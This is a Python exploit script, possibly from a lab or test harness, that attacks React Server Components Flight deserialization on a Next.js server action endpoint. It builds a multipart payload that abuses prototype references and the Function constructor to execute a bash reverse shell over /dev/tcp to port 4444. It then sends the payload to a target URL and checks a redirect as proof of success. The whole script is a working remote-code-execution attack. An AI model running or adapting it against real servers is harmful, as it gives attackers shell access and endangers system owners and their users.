#!/usr/bin/env python3
"""Trigger a shell through React Server Components Flight deserialization."""

import http.client
import json
import os
import time
import urllib.parse


SHELL_COMMAND = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"
BOUNDARY = "----react001flightboundary"


def make_flight_payload() -> bytes:
    prefix = (
        "process.mainModule.require('child_process').exec("
        + json.dumps(SHELL_COMMAND)
        + ");throw Object.assign(new Error('NEXT_REDIRECT'),"
        + "{digest:'NEXT_REDIRECT;push;/login?a=triggered;307;'});"
    )
    model = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }
    fields = (
        ("0", json.dumps(model, separators=(",", ":"))),
        ("1", '"$@0"'),
        ("2", "[]"),
    )
    body = "".join(
        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
        for name, value in fields
    )
    return (body + f"--{BOUNDARY}--\r\n").encode("utf-8")


def trigger_shell(target_url: str) -> tuple[int, str | None]:
    target = urllib.parse.urlsplit(target_url)
    if target.scheme != "http" or not target.hostname:
        raise ValueError("target URL must be HTTP with a hostname")
    connection = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=30)
    try:
        connection.request(
            "POST",
            target.path or "/",
            body=make_flight_payload(),
            headers={
                "Next-Action": "x",
                "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
            },
        )
        response = connection.getresponse()
        response.read()
        return response.status, response.getheader("x-action-redirect")
    finally:
        connection.close()


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    status, redirect = trigger_shell(target_url)
    if status != 303 or redirect != "/login?a=triggered;push":
        raise RuntimeError(f"Flight payload did not reach the vulnerable path: {status}, {redirect}")
    time.sleep(3)
    print(json.dumps({
        "evidence_payload": {},
        "request_status": status,
        "action_redirect": redirect,
    }))


if __name__ == "__main__":
    main()
